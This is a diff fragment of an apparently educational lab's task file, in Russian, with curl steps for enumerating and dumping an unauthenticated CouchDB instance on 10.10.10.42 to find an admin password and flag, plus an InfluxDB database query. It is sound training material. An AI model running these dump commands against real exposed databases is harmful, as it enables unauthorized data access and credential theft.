@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: длинный хвост хранилищ на 10.10.10.42\n\nНа хосте `10.10.10.42` открыто несколько хранилищ. Начни с CouchDB (5984).\n\n1. Версия: `curl -s http://10.10.10.42:5984/`.\n2. Список баз: `curl -s http://10.10.10.42:5984/_all_dbs` — если отдало, ты «админ» (admin party).\n3. Дамп: `curl -s 'http://10.10.10.42:5984/appdb/_all_docs?include_docs=true'`.\n4. Найди пароль admin, запиши флаг: `... | grep 'nto' > found.txt` и `check`.\nБонус: InfluxDB на 8086 — `curl -s 'http://10.10.10.42:8086/query?q=SHOW+DATABASES'`.\n"
+      "text": "# Практика: длинный хвост хранилищ на 10.10.10.42\n\nНа хосте `10.10.10.42` открыто несколько хранилищ. Начни с CouchDB (5984).\n\n1. Версия: `curl -s http://10.10.10.42:5984/`.\n2. Список баз: `curl -s http://10.10.10.42:5984/_all_dbs` — если отдало, ты «админ» (admin party).\n3. Дамп: `curl -s 'http://10.10.10.42:5984/appdb/_all_docs?include_docs=true'`.\n4. Найди пароль admin, запиши флаг: `... | grep 'nto' > found.txt` и `check`.\nБонус: InfluxDB на 8086 — `curl -s 'http://10.10.10.42:8086/query?q=SHOW+DATABASES'`.\n\n## Повторение (`web-nosql-injection`)\n\nХранилища из длинного хвоста тоже отдают HTTP-API; в `web-nosql-injection` ты начинал с **проверки доступа к корню**. Здесь — CouchDB:\n\n    curl -s http://10.10.10.42:5984/\n\nОтвет с `\"couchdb\"` и без запроса пароля — это «admin party», с которого начинается дамп.\n"
     }
   ],
   "tools": {
